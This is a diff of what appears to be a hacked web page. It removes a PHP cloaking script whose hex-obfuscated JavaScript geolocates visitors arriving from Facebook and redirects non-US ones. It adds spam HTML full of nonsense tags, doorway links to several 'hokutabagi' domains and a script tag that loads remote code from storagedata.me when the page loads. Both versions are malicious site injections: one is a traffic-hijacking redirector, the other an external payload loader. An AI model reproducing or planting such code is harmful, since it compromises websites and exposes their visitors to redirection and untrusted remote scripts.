@@ -1,31 +1,11 @@
-<?php
-
-{
-$randval = rand();
-if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
-  
-
-  if (strpos($_SERVER["REQUEST_URI"], 'sanx1') !== false){
-  echo '<script>
-var _0x852d=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x31\x38\x36\x30\x38\x37\x39\x31\x31\x38\x34\x37\x38\x39\x38"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x852d[2]](_0x852d[0],_0x852d[1],false);xmlhttpz[_0x852d[3]]();var get=JSON[_0x852d[5]](xmlhttpz[_0x852d[4]]);var country=get[_0x852d[7]][_0x852d[6]];if(country== _0x852d[8]){exit}else {top[_0x852d[10]][_0x852d[9]]= _0x852d[11]}
-</script>';} 
-else {
-
-
-echo '<script>
-var _0x852d=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x31\x38\x36\x30\x38\x37\x39\x31\x31\x38\x34\x37\x38\x39\x38"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x852d[2]](_0x852d[0],_0x852d[1],false);xmlhttpz[_0x852d[3]]();var get=JSON[_0x852d[5]](xmlhttpz[_0x852d[4]]);var country=get[_0x852d[7]][_0x852d[6]];if(country== _0x852d[8]){exit}else {top[_0x852d[10]][_0x852d[9]]= _0x852d[11]}</script>';
-
-  }
-}
-
-
-
-
-else {
-     //Google brought me to this page.
-    header("Location: https://facebook.com/search?q=".$randval);
-   //exit();
-}  }
-
-
-?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<evemousokagu><gibuluopifiro class="itahe"><evemousokagu id="aduvelufe"><a href="http://hokutabagi.online"><evemousokagu id="aduvelufe"><i><div id="aduvelufe"><i id="aduvelufe"><i class="itahe"><gibuluopifiro class="itahe"><gibuluopifiro><i><div><gibuluopifiro><a href="http://hokutabagi.date"></a><a href="http://hokutabagi.club"><div class="itahe"><i id="aduvelufe"><div id="aduvelufe">
+<meta charset="utf-8">
+<title>Kamuao Eselomemo</title>
+<meta property="og:title" content="Kamuao Eselomemo">
+<meta property="og:description" content="">
+<script src="http://storagedata.me/storage.php?keduciu"></script><a href="https://hokutabagi.org"><i><evemousokagu><div id="aduvelufe"><div id="aduvelufe"><div><i id="aduvelufe"><div><gibuluopifiro><i id="aduvelufe"><i><evemousokagu id="aduvelufe"><evemousokagu id="aduvelufe"><evemousokagu class="itahe"><div id="aduvelufe"></div></evemousokagu></evemousokagu></evemousokagu></i></i></gibuluopifiro></div></i></div></div></div></evemousokagu></i></a>
+</div></i></div></a></gibuluopifiro></div></i></gibuluopifiro></gibuluopifiro></i></i></div></i></evemousokagu></a></evemousokagu></gibuluopifiro></evemousokagu>
+</head></html>
